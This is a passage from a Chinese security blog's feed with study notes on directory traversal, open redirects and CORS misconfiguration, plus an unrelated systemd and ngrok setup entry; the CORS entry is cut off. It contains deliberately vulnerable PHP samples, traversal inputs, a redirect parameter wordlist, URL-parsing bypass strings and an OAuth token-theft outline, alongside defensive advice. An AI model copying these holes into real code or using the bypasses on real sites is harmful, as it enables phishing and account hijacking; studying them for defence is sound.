    <link href="/2022/05/31/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/05/31/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>代码写的有问题或者服务器配置错误导致服务器上的目录信息暴露。有两种情况，一种是程序的代码中把服务器的目录情况回显出来了；另一种情况是nginx或者apache等中间件的配置有问题导致目录暴露。</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h2><p>举个例子，path 可控 传入 scandir 函数再进行输出，会造成目录遍历漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir_path</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br><span class="hljs-variable">$filename</span>=<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$dir_path</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>../</code>是返回上一级目录的意思</p><p>传入path&#x3D;.&#x2F; 可回显当前目录 </p><p>传入path&#x3D;..&#x2F; 可回显当前目录 </p><p>传入path&#x3D;&#x2F; 可回显根目录</p><p>传入path&#x3D;~&#x2F; 可回显用户目录</p><h2 id="中间件配置问题"><a href="#中间件配置问题" class="headerlink" title="中间件配置问题"></a>中间件配置问题</h2><p>中间件如果设置不当的时，也会造成目录遍历，如 apache ngnix iis 目录浏览，均可造成目录遍历</p><p>但是 这种目录遍历，只能遍历网站根目录，除非有特殊设置。 通过遍历目录或文件，寻找敏感文件，如 session 登录验证文件，数据库备份等。</p><h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><ol><li><p>对用户的输入进行验证，特别是路径替代字符如“..&#x2F;”和“~&#x2F;”。</p></li><li><p>尽可能采用白名单的形式，验证所有的输入。 </p></li><li><p>合理配置 Web 服务器的目录权限。 </p></li><li><p>当程序出错时，不要显示内部相关配置细节。 </p></li><li><p>对用户传过来的文件名参数进行统一编码，对包含恶意字符或者空字符的参数进行拒绝。</p></li></ol><h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><p>记录一些常见的会导致目录遍历的trick</p><p>注意请求中的参数，有以下参数很可能存在漏洞</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs applescript">js<br>img<br><span class="hljs-built_in">file</span><br>CurrentFolder<br>Folder<br><br></code></pre></td></tr></table></figure><h2 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h2><p>在一个案例中，js参数本应该传入一个指定的js文件，但是可以传入一个目录，最后可以用%00截断js的后缀名</p><h2 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h2><p>某网站用了fck富文本编辑器。其中有一个参数<code>CurrentFolder</code>可以传入目录导致目录遍历</p><h2 id="trick1"><a href="#trick1" class="headerlink" title="trick1"></a>trick1</h2><p>注意静态资源的文件夹，看看能不能访问这个目录</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/4855">Nginx配置不当可能导致的安全问题</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>目录遍历</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>systemd小学习</title>
    <link href="/2022/05/30/systemd%E5%B0%8F%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/05/30/systemd%E5%B0%8F%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>systemd就不多介绍了，用于linux中的进程管理。功能太强大了，看文档看的一脸懵逼。最近有个实际需求，有个web项目要上线，部署的时候需要用到进程管理来保障服务的存活，以及在出错时需要服务自动重启，实现一些监控的需求。所以就简单学习了一下systemd这款工具，做个记录。</p><h1 id="0x01-最简单配置"><a href="#0x01-最简单配置" class="headerlink" title="0x01 最简单配置"></a>0x01 最简单配置</h1><p>web项目使用django开发，本地sqlite3做数据库和缓存，nginx做前置端口转发和静态资源的代理，gunicorn做web容器。需要用systemd添加一个service来启动gunicorn，简单配置如下：</p><p>在<code>/etc/systemd/system</code>下创建<code>web.service</code>文件，文件名即为服务名，也就是这里的“web”。后续需要通过这个服务名来启动服务</p><p>文件内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span> = web service<br><br><span class="hljs-comment"># follow the system start</span><br><span class="hljs-attr">After</span> = network.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">WorkingDirectory</span>=/var/www/html/wooyun/wooyun<br><span class="hljs-attr">ExecStart</span>=bash /var/www/html/wooyun/wooyun/start_gunicorn.sh<br><br><span class="hljs-comment"># restart when gunicorn is down</span><br><span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-failure<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-comment"># follow the system start</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><p>简单说一下配置，<code>After = network.target</code>和<code>WantedBy=mutil-user.target</code>用于服务器重启后自动启动该服务，<code>ExecStart</code>为启动命令，<code>Restart=on-failure</code>是在gunicorn挂掉时自动重启服务。</p><p>保存文件后，还需要一条命令来让自动重启生效</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> web<br></code></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> web<br></code></pre></td></tr></table></figure><p>查看服务状态</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status web</span><br></code></pre></td></tr></table></figure><p>注意：如果修改了服务的配置文件，也就是<code>/etc/systemd/system</code>下的<code>web.service</code>后，需要一条命令让配置生效</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl daemon-reload</span><br></code></pre></td></tr></table></figure><p>查看系统日志（system logs），用于查看一些详细的错误信息</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">journalctl</span><br></code></pre></td></tr></table></figure><h1 id="0x02-问题排查"><a href="#0x02-问题排查" class="headerlink" title="0x02 问题排查"></a>0x02 问题排查</h1><p>这里由于我的web项目在python的虚拟环境中，不能直接用脚本的形式启动了，需要改一下配置文件，直接用虚拟环境里的二进制程序启动，把<code>ExecStart</code>改为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ExecStart=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>wooyun<span class="hljs-regexp">/bin/gu</span>nicorn wooyun.wsgi -b <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8000</span> -w <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h1 id="0x03-优化"><a href="#0x03-优化" class="headerlink" title="0x03 优化"></a>0x03 优化</h1><p>将gunicorn的参数写在一个配置文件里，这样如果配置需要改变，就不需要来改变service文件中的启动命令了，也不用<code>systemctl daemon-reload</code>这条命令了。以后只要更改配置文件后重启一下服务就可以，这也是大多数应用程序的做法，如nginx</p><p>在项目目录下写一个gunicorn_config.py的文件，写gunicorn的配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>bind = <span class="hljs-string">&quot;0.0.0.0:8000&quot;</span><br><br>workers = os.cpu_count() * <span class="hljs-number">2</span> - <span class="hljs-number">1</span><br><br>cur_dir = os.path.dirname(__file__)<br><br>loglevel = <span class="hljs-string">&#x27;warning&#x27;</span><br><br>errorlog = os.path.join(cur_dir, <span class="hljs-string">&#x27;error.log&#x27;</span>)<br><br>accesslog = os.path.join(cur_dir, <span class="hljs-string">&#x27;access.log&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后在<code>wooyun.com.service</code>中将<code>ExecStart</code>改为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ExecStart=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>wooyun<span class="hljs-regexp">/bin/gu</span>nicorn -c gunicorn_config.py wooyun.wsgi<br></code></pre></td></tr></table></figure><h1 id="0x04-ngrok"><a href="#0x04-ngrok" class="headerlink" title="0x04 ngrok"></a>0x04 ngrok</h1><p>同理，配置ngrok服务，实现内网穿透</p><p>首先创建ngrok的配置文件，在~&#x2F;.config&#x2F;ngrok&#x2F;ngrok.yml下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;2&quot;</span><br><span class="hljs-attr">authtoken:</span> <span class="hljs-string">换成你自己的</span><br><span class="hljs-attr">log_level:</span> <span class="hljs-string">info</span><br><span class="hljs-attr">log_format:</span> <span class="hljs-string">json</span><br><span class="hljs-attr">log:</span> <span class="hljs-string">/var/log/ngrok.log</span><br><span class="hljs-attr">web_addr:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:4040</span><br><span class="hljs-attr">tunnels:</span><br>  <span class="hljs-attr">ssh:</span><br>    <span class="hljs-attr">proto:</span> <span class="hljs-string">tcp</span><br>    <span class="hljs-attr">addr:</span> <span class="hljs-number">22</span><br>  <span class="hljs-attr">web_wooyun:</span><br>    <span class="hljs-attr">proto:</span> <span class="hljs-string">http</span><br>    <span class="hljs-attr">addr:</span> <span class="hljs-number">80</span><br>    <span class="hljs-attr">basic_auth:</span> <br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;username:password&quot;</span><br></code></pre></td></tr></table></figure><p>翻官网文档看到ngrok本身支持用service，那就不用我们自己写service文件了，直接上命令</p><p>首先安装服务：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ngrok service install --config <span class="hljs-regexp">/root/</span>.config<span class="hljs-regexp">/ngrok/</span>ngrok.yml<br></code></pre></td></tr></table></figure><p>再然后启动服务就完事了，满心欢喜</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">ngrok service <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure><p>诶，怎么报错了。。。服务启动失败。。也看不到报错信息</p><p>用<code>journalctl</code>看看系统日志，再最下面翻到了报错信息，看到这么一句话</p><blockquote><p>Your account is not authorized to run the agent as a service. Upgrade to a new Pro or Enterprise plan at:……</p></blockquote><p>意思就是把ngrok作为service来运行这是付费功能，要充钱。。。</p><p>得，那我自己手动创建服务试试</p><p>创建服务文件<code>ngrokd.service</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#/etc/systemd/system/ngrokd.service</span><br><br><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=ngrok<br><span class="hljs-attr">After</span>=network.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">ExecStart</span>=ngrok start --all<br><span class="hljs-attr">Restart</span>=always<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><p>接下来就是启动服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl start ngrokd<br></code></pre></td></tr></table></figure><p>依旧报错，行吧，你赢了，那我就只能以 后台进程 的方式启动了</p><p>众所周知，linux中在命令的后面加一个<code>&amp;</code>代表命令在后台运行，并且在命令前面加上<code>nohup</code>可以不受挂断信号（hang up）的影响，也就是说session退出后命令依旧在服务器上跑着。于是构成以下命令</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">nohup ngrok <span class="hljs-built_in">start</span> <span class="hljs-comment">--all &amp;</span><br></code></pre></td></tr></table></figure><p>但有个问题，这样就看不到ngrok的输出的地址了，其实我们刚刚在配置文件中开启了web interface访问管理界面也就是4040端口，就可以看到线上地址了</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.bilibili.com/video/BV1e4411z73Z">https://www.bilibili.com/video/BV1e4411z73Z</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重定向漏洞备忘录</title>
    <link href="/2022/05/25/%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2022/05/25/%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h1><p>做过开发的一定都知道，网站重定向技术分为两种，一种是后台的重定向，比如php，在响应头中写一个<code>location</code>字段，另一种是前台跳转，也就是通过html中的meta标签或者js语言中的函数来跳转。一般来说只能跳转到可信的域名，但如果没有对要跳转的域名做检查或限制，就会造成可以跳转到非可信域名上，比如钓鱼页面。</p><h1 id="0x01-漏洞代码分析"><a href="#0x01-漏洞代码分析" class="headerlink" title="0x01 漏洞代码分析"></a>0x01 漏洞代码分析</h1><p>比如有下面这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>] != <span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;location:&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码中未对url参数做任何限制，导致我传入任意域名都会直接跳转过去。</p><h1 id="0x02-攻击"><a href="#0x02-攻击" class="headerlink" title="0x02 攻击"></a>0x02 攻击</h1><p>比如有一个可信域名mail.com，存在任意跳转的参数url，这时候我构造一个钓鱼页面mail.hacker.com，只要构造成这个链接<code>http://mail.com?url=http://mail.hacker.com</code>发给用户，用户点开连接就会调转到钓鱼页面上，由于钓鱼页面和真实页面外观上一摸一样，安全意识低的用户就会误以为是真实的页面，从而上当受骗。</p><p>另外，由于qq，淘宝等url过滤，是基于白名单放行，比如在qq聊天框里发送一个域名，如果这个域名可信，就会显示一个小绿标。如果页面存在重定向漏洞，就会绕过qq、淘宝的这种url检测，让用户误以为是可信的域名。</p><h1 id="0x03-防御"><a href="#0x03-防御" class="headerlink" title="0x03 防御"></a>0x03 防御</h1><p>我们需要对传入的url做检测和限制，保证该url会跳转到可信的域名上，具体手段：</p><ol><li>对跳转的出口域名写死，或者设置白名单</li><li>全站检测跳转行为，如果检测到跳转行为，就先重定向到一个警示页面，告诫用户将跳转到其他域名（现在各大网站都是这么做的，如 知乎、csdn）</li></ol><h1 id="0x04-挖洞"><a href="#0x04-挖洞" class="headerlink" title="0x04 挖洞"></a>0x04 挖洞</h1><p>关于如何挖掘此类漏洞，白盒的方法就是检查代码中是否存在跳转相关的代码段，如php中的<code>header(&#39;location:&#39;</code></p><p>黑盒的话：</p><ol><li>特别注意站点是否存在oauth登录，这里常常会存在重定向漏洞，</li><li>也可以分析url中的参数名，是否存在诸如<code>url</code>、<code>redirect</code>等字样的参数，再手工或自动化验证。</li><li>也可以从js文件中搜索关键字，在搜索中需要注意大小写的问题</li></ol><p>参数字典：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs vim">returnurl<br>redirect<br>redirect_uri<br>redirect_url<br>errURL<br>mainUrl<br>callback<br>url<br>uri<br><span class="hljs-keyword">next</span><br>target<br>rurl<br>dest<br>destination<br><span class="hljs-keyword">redir</span><br>out<br><span class="hljs-keyword">view</span><br><span class="hljs-keyword">to</span><br>image_url<br><span class="hljs-keyword">go</span><br><span class="hljs-keyword">return</span><br>returnTo<br>return_to<br>checkout_url<br><span class="hljs-keyword">continue</span><br>return_path<br><span class="hljs-keyword">a</span><br><span class="hljs-keyword">u</span><br>r<br></code></pre></td></tr></table></figure><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><p>这里需要科普一下url的构成：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">scheme:<span class="hljs-comment">[//<span class="hljs-comment">[user<span class="hljs-comment">[:password]</span>@]</span>host<span class="hljs-comment">[:port]</span>]</span><span class="hljs-comment">[/path]</span><span class="hljs-comment">[?query]</span><span class="hljs-comment">[#fragment]</span><br></code></pre></td></tr></table></figure><p>注：中括号[]中的变量为可选参数</p><p><code>scheme</code>：协议，也就是常见的“http”和“https”</p><p><code>user</code>：用户名</p><p><code>password</code>：密码</p><p><code>host</code>：域名，可以只有一级域名，也可以是子域名如<code>www.baidu.com</code></p><p><code>post</code>：端口号，http端口号就是80，https端口号就是443</p><p><code>path</code>：访问路径，也可以说是资源路径</p><p><code>query</code>：查询参数</p><p><code>fragment</code>：片段，也就是常说的”锚点“，用于定位资源内容</p><p>问题就出在，user和password这两个参数是可以省略的，我们常见的url比如<code>https://www.baidu.com</code>是省略了用户名和密码的。有的检测方法只匹配了跟在http:&#x2F;&#x2F;后面的域名，这就出问题了。比如有一个url为<code>http://youku.com:123@baidu.com</code>，用上述的检测方法判定这个域名是”youku.com“，但实际上这个域名是”baidu.com“。那就好了，只要我在用户名处填入一个可信域名，在真实的域名的位置填入一个恶意域名，这样就可以绕过检测从而跳转到恶意网站。</p><p>另外经过我的试验，chrome中，一些畸形的url也能被浏览器”智能“地识别纠正过来，这也会造成绕过，如</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>:@baidu.com  <span class="hljs-meta"># 空用户名密码，以及不加双斜杠</span><br><span class="hljs-symbol">http:</span>/baidu.com  <span class="hljs-meta"># 少一个反斜杠</span><br><span class="hljs-symbol">http:</span>///baidu.com  <span class="hljs-meta"># 多一个反斜杠，实际测试中发现n多个反斜杠都没事</span><br><span class="hljs-symbol">http:</span>/@baidu.com<br><span class="hljs-symbol">http:</span>baidu.com:<span class="hljs-subst">@4399</span>.com<br>...<br></code></pre></td></tr></table></figure><h2 id="账号劫持"><a href="#账号劫持" class="headerlink" title="账号劫持"></a>账号劫持</h2><p>在oauth处的重定向请求头字段中的敏感信息，如referer等，甚至可以实现账号劫持。参考wooyun-2011-02010</p><p>在oauth1.0协议中，oauth_callback参数可重定向到任意网站，在恶意网站接收secret，oauth_token，oauth_verifier关键参数，就可以通过登录接口登录受害者的账户。整个过程只需要受害者点击一个恶意的授权URL即可。</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>重定向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CORS跨域资源共享漏洞</title>
    <link href="/2022/05/25/CORS%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/05/25/CORS%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>其实大体上原理和jsonp攻击差不多，也是利用了浏览器跨域获取信息。在jsonp中我们说过，在js中发起http请求，比如用XMLHttpRequest 或 fetch等，默认只能获取同源的域中的资源，无法跨域获取资源。但如果服务器本身同意了跨域请求，那也可以在前端js中跨域请求资源。那么服务器如何告知浏览器，它支持跨域请求呢？这里就需要引入CORS（跨域资源共享）这个概念了。</p><h2 id="CORS原理"><a href="#CORS原理" class="headerlink" title="CORS原理"></a>CORS原理</h2><p>我们先来回顾一下CORS跨域获取资源的过程：</p><p>CORS定义了两种跨域请求：简单请求和非简单请求。简单跨域请求就是使用设定的请求方式请求数据，而非简单跨域请求则是在使用设定的请求方式请求数据之前，先发送一个OPTIONS预检请求，验证请求源是否为服务端允许的源，只有预检通过后才会再发送一次请求用于数据传输。</p><p>CORS运行机制：第一步，在浏览器发起请求时，自动在请求头中添加了Origin字段，浏览器定义了js不可以修改请求头中的Origin字段，确保了在浏览器中发起请求的Origin确实为用户真实的源地址，而非伪造的地址。第二步，服务器通过验证Origin字段来判断请求是否被允许，从而实现浏览器的跨域访问。</p><h2 id="CORS相关名词解释"><a href="#CORS相关名词解释" class="headerlink" title="CORS相关名词解释"></a>CORS相关名词解释</h2><p>服务端需要在响应头中包含一些CORS相关的字段来告诉浏览器，该服务器使用的CORS策略是怎么样的。</p><p><code>Access-Control-Allow-Origin</code>：该字段是必须的。设置了哪些来源才可以跨域访问服务器上的资源。</p><p><code>Access-Control-Allow-Credentials</code>：该字段可选，值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包含在CORS请求中，当设置为True时，表示服务器允许Cookie可以包含在请求中一起发送给服务器。这个值也只能设置为True，如果服务器不允许浏览器发送Cookie，直接删除该字段即可。</p><p><code>Access-Control-Expose-Headers</code>：该字段可选。CORS请求时，AJAX对象只能从响应头中拿到6个基本字段：Cache-Control，Content-Language，Content-Type，Expires，Last-Modified，Pragma。如果想要拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>中指定。</p><p><code>Access-Control-Request-Methods</code>：一般为<code>POST,GET,OPTIONS</code></p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>依旧是一个正常的服务端，有一个返回个人信息的api接口，只不过这次在响应头中增加了<code>Access-Control-Allow-Origin:*</code>，接受任意来源的跨域请求。代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin:*&#x27;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type: application/json&#x27;</span>);<br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;(&#123;&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;alice&quot;,&quot;email&quot;:&quot;alice@qq.com&quot;&#125;)&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>正常的页面的前端，直接用ajax跨域请求这个api即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>info api<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://192.168.0.104:81/user.php&#x27;</span>)</span><br><span class="language-javascript">    .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> (res.<span class="hljs-title function_">text</span>());</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript">    .<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">text</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;请求成功：&#x27;</span>,text);</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript">    .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;请求错误：&#x27;</span>,error);</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/image-20220525180351988.png" alt="image-20220525180351988"></p><p>可以看到请求的来源和服务端不在同一个域，通过服务器返回响应头中的<code>Access-Control-Allow-Origin: 